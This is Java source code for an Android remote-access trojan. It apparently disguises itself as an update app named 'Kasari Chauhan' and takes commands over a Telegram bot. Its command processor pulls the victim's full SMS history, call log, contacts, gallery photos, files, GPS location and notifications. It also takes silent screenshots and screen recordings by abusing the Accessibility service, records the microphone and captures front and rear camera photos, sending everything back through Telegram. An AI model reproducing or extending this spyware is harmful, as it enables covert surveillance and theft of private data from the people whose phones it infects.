package com.kasari.update;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class CommandProcessor {

    public static void handle(Context ctx, String text) {
        new Thread(() -> process(ctx, text)).start();
    }

    private static void process(Context ctx, String raw) {
        String cmd = raw.trim();
        String lower = cmd.toLowerCase();

        if (lower.equals("/help")) {
            TelegramController.sendMessage(
                "\uD83D\uDCCB COMMANDS [" + BackgroundService.deviceId + "]\n\n" +
                "\uD83D\uDCF1 Status:\n" +
                "/status — Device info\n" +
                "/apps — Installed apps\n\n" +
                "\uD83D\uDCAC SMS:\n" +
                "/sms_all — Full SMS history\n\n" +
                "\uD83D\uDCDE Calls:\n" +
                "/calllog — Last 100 calls\n\n" +
                "\uD83D\uDCCC Data:\n" +
                "/contacts — All contacts\n" +
                "/gallery [N] — Last N photos\n" +
                "/files [path] — Browse files\n\n" +
                "\uD83D\uDCCD Location:\n" +
                "/location — GPS + IP fallback\n\n" +
                "\uD83D\uDCF8 Screen:\n" +
                "/screenshot — Silent screenshot\n" +
                "/screen_start [sec] — Auto screenshot\n" +
                "/screen_stop — Stop auto\n" +
                "/screen_record [sec] — MP4 video\n\n" +
                "\uD83C\uDFA4 Mic:\n" +
                "/mic [sec] — Record N seconds\n" +
                "/mic_start — Record until mic_stop\n" +
                "/mic_stop — Stop & send recording\n\n" +
                "\uD83D\uDCF7 Camera:\n" +
                "/cam — Front photo\n" +
                "/cam_back — Rear photo\n\n" +
                "\uD83D\uDD14 Live:\n" +
                "/notifications — Last 20 notifications\n"
            );

        } else if (lower.equals("/status")) {
            TelegramController.sendMessage(
                "\uD83D\uDCCA Device: [" + BackgroundService.deviceId + "]\n" +
                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Screen: " + (ScreenMirror.instance != null ? "\u2705 Accessibility ON" : "\u274C Accessibility OFF") + "\n" +
                "Mic: " + (VoiceRecorder.isRecording ? "\uD83D\uDD34 Recording..." : "\u23F9 Idle")
            );

        } else if (lower.equals("/sms_all")) {
            SmsForwarder.sendAllHistory(ctx);

        } else if (lower.equals("/calllog")) {
            ContactGrabber.sendCallLog(ctx);

        } else if (lower.equals("/contacts")) {
            ContactGrabber.sendContacts(ctx);

        } else if (lower.startsWith("/gallery")) {
            int n = Integer.MAX_VALUE;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { n = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            final int limit = n;
            new Thread(() -> FileExplorer.sendGallery(ctx, limit)).start();

        } else if (lower.startsWith("/files")) {
            String path = "/sdcard";
            String[] p = cmd.trim().split("\\s+", 2);
            if (p.length > 1) path = p[1];
            FileExplorer.listDirectory(path);

        } else if (lower.equals("/location")) {
            new Thread(() -> LocationTracker.getLocation(ctx)).start();

        } else if (lower.equals("/screenshot")) {
            if (ScreenMirror.instance != null) {
                ScreenMirror.instance.requestCapture();
            } else {
                TelegramController.sendMessage("\u274C Accessibility Service enable karo.\nSettings \u2192 Accessibility \u2192 Kasari Chauhan \u2192 ON");
            }

        } else if (lower.startsWith("/screen_start")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            if (ScreenMirror.instance != null) {
                ScreenMirror.instance.startContinuous(sec);
            } else {
                TelegramController.sendMessage("\u274C Accessibility Service enable karo.");
            }

        } else if (lower.equals("/screen_stop")) {
            if (ScreenMirror.instance != null) ScreenMirror.instance.stopContinuous();

        } else if (lower.startsWith("/screen_record")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            if (ScreenMirror.instance != null) {
                Intent i = new Intent(ctx, ScreenRecordService.class);
                i.setAction(ScreenRecordService.ACTION_RECORD);
                i.putExtra(ScreenRecordService.EXTRA_SECONDS, sec);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i); else ctx.startService(i);
                TelegramController.sendMessage("\uD83C\uDFAC Recording shuru \u2014 " + sec + "s baad MP4 aayega.");
            } else {
                TelegramController.sendMessage("\u274C Accessibility Service enable karo.");
            }

        // ── Mic fixed time ─────────────────────────────────────────────────
        } else if (lower.startsWith("/mic") && !lower.equals("/mic_start") && !lower.equals("/mic_stop")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            if (VoiceRecorder.isRecording) {
                TelegramController.sendMessage("\u26A0\uFE0F Pehle /mic_stop karo.");
                return;
            }
            Intent i = new Intent(ctx, VoiceRecorder.class);
            i.setAction(VoiceRecorder.ACTION_MIC);
            i.putExtra(VoiceRecorder.EXTRA_SECONDS, sec);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i); else ctx.startService(i);

        // ── Mic manual start ───────────────────────────────────────────────
        } else if (lower.equals("/mic_start")) {
            if (VoiceRecorder.isRecording) {
                TelegramController.sendMessage("\u26A0\uFE0F Mic pehle se chal raha hai. /mic_stop karo.");
                return;
            }
            Intent i = new Intent(ctx, VoiceRecorder.class);
            i.setAction(VoiceRecorder.ACTION_MIC_START);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i); else ctx.startService(i);

        // ── Mic manual stop ────────────────────────────────────────────────
        } else if (lower.equals("/mic_stop")) {
            if (!VoiceRecorder.isRecording) {
                TelegramController.sendMessage("\u274C Koi recording nahi chal rahi.");
                return;
            }
            Intent i = new Intent(ctx, VoiceRecorder.class);
            i.setAction(VoiceRecorder.ACTION_STOP);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i); else ctx.startService(i);
            TelegramController.sendMessage("\u23F9 Mic ruk rahi hai... recording bhej raha hoon.");

        } else if (lower.equals("/cam")) {
            CameraCapture.capture(ctx, false);

        } else if (lower.equals("/cam_back")) {
            CameraCapture.capture(ctx, true);

        } else if (lower.equals("/apps")) {
            AppManager.sendInstalledApps(ctx);

        } else if (lower.equals("/notifications")) {
            NotificationCatcher.sendRecent();
        }
    }
}